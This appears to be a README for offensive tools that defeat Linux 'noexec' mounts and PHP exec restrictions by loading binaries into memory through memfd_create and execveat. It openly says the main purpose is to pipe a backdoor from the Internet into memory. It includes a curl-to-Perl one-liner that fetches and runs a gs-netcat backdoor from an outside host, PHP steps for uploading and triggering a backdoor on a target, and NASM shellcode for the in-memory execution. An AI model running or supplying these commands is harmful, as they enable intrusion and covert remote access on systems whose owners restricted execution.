## Circumvent the `noexec` mount flag on Linux and execute abritrary binaries

This if useful on a Linux system when all writeable locations are mounted with `-o noexec` (including /dev/shm) or to escape PHP's 'exec' restrictions.

Use _one_ of the 3 scripts (perl, bash, php):

- The binary does not need to have +x
- The binary can reside on a noexec-partition
- Mostly the binary can be piped directly from the Internet into the memory (and executed there)
- Works as non-root users
- The PHP variant also circumvents PHP's "exec" restrictions.
- It injects shellcode into the running process and calls [memfd_create(2)](https://man7.org/linux/man-pages/man2/memfd_create.2.html) and [execveat(2)](https://man7.org/linux/man-pages/man2/execveat.2.html) to load a binary from a noexec-partition (or directly from the Internet).
- BASH and PHP do not support SYSCALLS. We advanced an old trick.

Read the [circumventing the noexec Article](SOON) for more....

PERL example:
```sh
source memexec-perl.sh
cat /usr/bin/id | memexec -u
```
This was golfed by the fine people on Mastodon ([@acut3hack](https://@acut3hack@infosec.exchange), [@addision](https://@addison@nothing-ever.works), [@ilv](https://@ilv@infosec.exchange))

BASH example (by [@messede-degod](https://github.com/messede-degod):
```sh
source memexec-bash.sh
cat /usr/bin/id | memexec
```

The educated reader understands that this is mostly used to pipe a backdoor from the Internet directly into memory, even when execution is prohobited by `noexec`:
```shell
curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilDq -s ChangeMe" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
```

The PHP variant also circumvents ["shell_exec" restrictions](https://www.cyberciti.biz/faq/linux-unix-apache-lighttpd-phpini-disable-functions/).

1. Upload `memexec.php` and `egg` (your backdoor) onto the target
2. Call `curl -SsfL https://target/memexec.php` to execute `egg`

---

For the druggies among us, here is some NASM to keep you happy.
```nasm
; nasm -felf64 open.nasm && ld open.o &&  ./a.out
; 
global _start
section .text

_start:
    push    0x00676765  ; "egg"
    mov     rax, 0x13f
    mov     rdi, rsp    ; arg 1: name [egg]
    xor     rsi, rsi    ; arg 2: 0 = no MFD_CLOEXEC
    syscall
    mov     r8, rax

    mov     rax, 2
    mov     rdi, rsp    ; arg 1: name [egg]
    xor     rsi, rsi    ; arg 2: 0 = O_RDONLY
    syscall
    mov     r9, rax

loop:
    sub     rsp, 0x400
    xor     rax, rax    ; arg 0: read_NR
    mov     rdi, r9     ; arg 1: FD [egg]
    mov     rsi, rsp    ; arg 2: buffer
    mov     edx, 0x400  ; arg 3: length
    syscall

    cmp     rax, 0x00
    jle     done        ; EOF

    mov     rdx, rax    ; arg 2: length (from read()) 
    mov     eax, 0x01   ; arg 0: write_NR
    mov     rdi, r8     ; arg 3: FD [memfd]
    syscall
    jmp     loop
done:

    mov     rax, 322    ; arg 0: execveat_NR
    mov     rdi, r8     ; arg 1: memfd
    push    0x00
    mov     rsi, rsp    ; arg 2: path (empty string)
    xor     rdx, rdx    ; arg 3: ARGV [NULL]
    xor     rcx, rcx    ; arg 4: ENV ?
    xor     r9, r9      ; arg 4: ENV ?
    xor     r10, r10    ; arg 4: ENV
    mov     r8, 0x1000  ; arg 5: AT_EMPTY_PATH
    syscall
    
    mov     rax, 60
    xor     rdi, rdi
    syscall
```
